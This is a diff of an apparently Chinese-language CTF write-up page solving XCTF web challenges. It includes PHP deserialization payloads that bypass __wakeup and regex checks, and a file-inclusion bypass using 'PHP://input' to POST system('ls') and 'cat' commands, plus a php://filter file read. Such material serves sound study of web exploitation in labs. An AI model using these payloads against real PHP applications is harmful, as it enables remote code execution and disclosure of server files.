@@ -222,7 +222,7 @@
             <div class="markdown-body" id="post-body">
               <p>接触php序列化的一天。。<br><a id="more"></a></p>
 <hr>
-<p>web php unserialiaze<br>进去就看到php代码<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>  </span>
+<p>web php unserialiaze<br>进去就看到php代码<br><div class="hljs"><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>  </span>
 <span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;  </span>
 <span class="php">	<span class="hljs-keyword">private</span> $file = <span class="hljs-string">'index.php'</span>;  </span>
 <span class="php">	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($file)</span> </span>&#123;  </span>
@@ -248,8 +248,8 @@
 <span class="php">	&#125; <span class="hljs-keyword">else</span> &#123;  </span>
 <span class="php">		highlight_file(<span class="hljs-string">"index.php"</span>);  </span>
 <span class="php">	&#125;  </span>
-<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>大致思路就是传$file是fl4g.php的Demo类给var，但是需要注意避开preg_match以及魔法函数__warkup()（在unserialize时起作用）的过滤。</p>
-<pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre></div><br>大致思路就是传$file是fl4g.php的Demo类给var，但是需要注意避开preg_match以及魔法函数__warkup()（在unserialize时起作用）的过滤。</p>
+<div class="hljs"><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
 <span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; </span>
 <span class="php">    <span class="hljs-keyword">private</span> $file = <span class="hljs-string">'index.php'</span>;</span>
 <span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($file)</span> </span>&#123; </span>
@@ -271,15 +271,15 @@
 <span class="php">$B = str_replace(<span class="hljs-string">'O:4'</span>,<span class="hljs-string">'O:+4'</span>,$B);<span class="hljs-comment">//+4绕过/d+的匹配</span></span>
 <span class="php">$B = base64_encode($B);</span>
 <span class="php"><span class="hljs-keyword">echo</span> $B;</span>
-<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre>
+<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre></div>
 <p>关于php反序列化漏洞：<a href="https://www.guildhab.top/?p=129" target="_blank" rel="noopener">https://www.guildhab.top/?p=129</a></p>
 <hr>
-<p>unserialize<br>还是反序列化，进去后页面上的代码如下<br><pre><code class="hljs awk">class xctf&#123;  
+<p>unserialize<br>还是反序列化，进去后页面上的代码如下<br><div class="hljs"><pre><code class="hljs awk">class xctf&#123;  
 public <span class="hljs-variable">$flag</span> = <span class="hljs-string">'111'</span>;  
 public <span class="hljs-keyword">function</span> __wakeup()&#123;  
 <span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);  
 &#125;  
-?code=</code></pre><br>绕过<strong>wakeup()即可<br>自己构造?code=o:4:”xctf”:2:{s:4:”flag”;s:3:”111”}（本来是:1:，改成2后属性检查不通过就不触发</strong>wakeup()函数）<br>或者是写php脚本<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+?code=</code></pre></div><br>绕过<strong>wakeup()即可<br>自己构造?code=o:4:”xctf”:2:{s:4:”flag”;s:3:”111”}（本来是:1:，改成2后属性检查不通过就不触发</strong>wakeup()函数）<br>或者是写php脚本<br><div class="hljs"><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
 <span class="php">	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;</span>
 <span class="php">		<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;</span>
 <span class="php">		<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;</span>
@@ -289,7 +289,7 @@ public <span class="hljs-keyword">function</span> __wakeup()&#123;
 <span class="php">	$a = <span class="hljs-keyword">new</span> xctf();</span>
 <span class="php">	$ans=serialize($a);</span>
 <span class="php">	<span class="hljs-keyword">echo</span> $ans;</span>
-<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>Web_php_include<br>进去后看到代码<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>  </span>
+<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre></div><br>Web_php_include<br>进去后看到代码<br><div class="hljs"><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>  </span>
 <span class="php">	show_source(<span class="hljs-keyword">__FILE__</span>);  </span>
 <span class="php">	<span class="hljs-keyword">echo</span> $_GET[<span class="hljs-string">'hello'</span>];  </span>
 <span class="php">	$page=$_GET[<span class="hljs-string">'page'</span>];  </span>
@@ -297,9 +297,9 @@ public <span class="hljs-keyword">function</span> __wakeup()&#123;
 <span class="php">		$page=str_replace(<span class="hljs-string">"php://"</span>, <span class="hljs-string">""</span>, $page);  </span>
 <span class="php">	&#125;  </span>
 <span class="php">	<span class="hljs-keyword">include</span>($page);  </span>
-<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>过滤php://，大写绕过，想到文件包含漏洞<br>进入?page=PHP://input<br>POST传数据<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code>，注意用burpsuit post传参时代码和请求头隔一行<br><img src="/2020/09/07/xctf20-9-07/%E6%89%B9%E6%B3%A8%202020-09-07%20121651.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>得到fl4gisisish3r3.php，index.php，phpinfo.php三个文件<br>再传参<code>&lt;?php system(&#39;cat fl4gisisish3r3.php&#39;);?&gt;</code> 得到flag<br>或者?page=PHP://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php</p>
+<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre></div><br>过滤php://，大写绕过，想到文件包含漏洞<br>进入?page=PHP://input<br>POST传数据<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code>，注意用burpsuit post传参时代码和请求头隔一行<br><img src="/2020/09/07/xctf20-9-07/%E6%89%B9%E6%B3%A8%202020-09-07%20121651.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>得到fl4gisisish3r3.php，index.php，phpinfo.php三个文件<br>再传参<code>&lt;?php system(&#39;cat fl4gisisish3r3.php&#39;);?&gt;</code> 得到flag<br>或者?page=PHP://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php</p>
 <hr>
-<p>web2<br>根据代码写出解密代码就可以了。<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<p>web2<br>根据代码写出解密代码就可以了。<br><div class="hljs"><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
 <span class="php">$miwen=<span class="hljs-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span>
 <span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span><span class="hljs-params">($_)</span></span>&#123;</span>
 <span class="php">$_=base64_decode(strrev(str_rot13($_)));</span>
@@ -312,7 +312,7 @@ public <span class="hljs-keyword">function</span> __wakeup()&#123;
 <span class="php"><span class="hljs-keyword">echo</span> strrev($_o);</span>
 <span class="php">&#125;</span>
 <span class="php">decode($miwen);</span>
-<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre></p>
+<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre></div></p>
 <hr>
 <p>php2<br>进去就一句话<br><img src="/2020/09/07/xctf20-9-07/image.png?v=1&amp;type=image" srcset="/img/loading.gif" alt><br>结果捣鼓半天完全没有头绪。<br>看wp是index.phps（完全想不到。。。）<br>然后就是根据代码构造id了</p>
 
